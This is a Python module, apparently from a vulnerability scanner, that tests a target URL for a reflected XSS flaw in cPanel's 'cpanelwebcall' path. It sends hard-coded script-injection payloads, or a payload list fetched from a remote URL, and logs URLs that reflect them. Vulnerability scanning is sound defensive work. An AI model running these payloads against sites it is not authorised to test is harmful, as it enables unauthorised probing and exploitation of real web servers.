import requests
import time
from ..includes.filewrite import writetofile

def check_internet():
    try:
        response = requests.get("http://www.google.com", timeout=5)
        response.raise_for_status()
        return True
    except requests.RequestException:
        return False

def cvescan(url=None, output=None, payload=None):
    try:
        while not check_internet():
            print("Waiting for internet connection...")
            time.sleep(5)
        if payload is None:
            xss_payloads = ['/cpanelwebcall/<img src=x onerror="prompt(1)">aaaaaaaaaaaa', '<script>alert(/XSS/)</script>']
        else:
            xss_payloads = requests.get(payload).text.splitlines()
        for xss_payload in xss_payloads:
            if not url.endswith('/'):
                url += '/'
            if not xss_payload.startswith('/cpanelwebcall/'):
                xss_payload = 'cpanelwebcall/' + xss_payload
            if xss_payload.startswith('/'):
                xss_payload = xss_payload[1:]
            if xss_payload is None:
                continue
            fullurl = url + xss_payload 
            print("Testing: " + fullurl)
            response = requests.get(fullurl)
            if response.status_code == 400:
                if 'aaaaaaaa' in response.text:
                    print("Vulnerable URL -> " + fullurl)
                    writetofile(fullurl, output)
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")
